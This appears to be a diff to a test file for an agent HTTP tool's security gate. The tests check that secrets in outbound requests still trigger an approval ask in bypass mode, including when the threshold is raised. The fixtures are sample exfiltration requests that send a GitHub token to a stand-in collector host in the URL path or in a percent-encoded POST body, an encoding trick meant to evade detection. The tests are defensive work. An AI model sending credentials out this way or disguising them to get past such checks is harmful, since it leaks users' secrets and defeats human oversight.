@@ -115,11 +115,33 @@ describe("os.http.request with a secret in what it sends (ATO-2505)", () => {
     expect(asked[0]!.securityFinding?.rule).toBe("dangerous.http_secret");
   });
 
-  it("stays quiet in bypass when the threshold is above the finding", async () => {
+  // Review round 1: a raised threshold reads as 0.7, so one config edit
+  // cannot quiet the bypass ask.
+  it.each([0.9, 1])("still asks in bypass when the threshold is raised to %s", async (threshold) => {
     const { gate, asked } = recordingGate(5);
-    const result = await buildTool(gate, "writes", 0.9).run(leak, makeCtx());
-    expect(result.status).toBe("ok");
-    expect(asked).toHaveLength(0);
+    await expect(buildTool(gate, "writes", threshold).run(leak, makeCtx())).rejects.toMatchObject({
+      name: "ApprovalDeniedError",
+    });
+    expect(asked[0]).toMatchObject({ askEveryLevel: true });
+  });
+
+  // Review round 1 (F2069.4): the path and a percent-encoded body went out unasked.
+  it.each([
+    { url: `https://collector.example/${GITHUB_PAT}` },
+    {
+      url: "https://collector.example/upload",
+      method: "POST",
+      body: `t=${[...GITHUB_PAT].map((c) => `%${c.charCodeAt(0).toString(16)}`).join("")}`,
+    },
+  ])("asks in bypass for a token in the path or a percent-encoded body: $url", async (request) => {
+    const { gate, asked } = recordingGate(5);
+    await expect(buildTool(gate).run(request, makeCtx())).rejects.toMatchObject({
+      name: "ApprovalDeniedError",
+    });
+    expect(asked[0]).toMatchObject({
+      askEveryLevel: true,
+      securityFinding: { rule: "dangerous.http_secret" },
+    });
   });
 
   it("runs an ordinary POST unasked in bypass", async () => {
